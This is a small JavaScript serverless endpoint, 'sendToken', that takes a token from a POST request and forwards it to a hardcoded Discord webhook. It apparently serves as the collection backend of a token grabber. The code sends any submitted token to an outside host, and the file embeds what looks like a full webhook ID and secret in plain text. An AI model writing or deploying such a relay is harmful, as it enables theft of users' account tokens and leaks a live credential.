// api/sendToken.js
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { token } = req.body;

    // Your webhook URL (replace with the actual webhook URL)
    const webhookURL = 'https://discord.com/api/webhooks/1333612145115664394/qAG8XiHS0hI9TfNqR2jKViMZ4vZDd_H0Dr7caazZ0Y0LNL_sA9P2rfPvtRgqhr2ZtvYN';

    try {
      // Send the token to your webhook
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ token }),
      });

      if (response.ok) {
        res.status(200).json({ message: 'Token sent successfully!' });
      } else {
        res.status(500).json({ error: 'Failed to send token' });
      }
    } catch (error) {
      res.status(500).json({ error: 'Server error' });
    }
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}
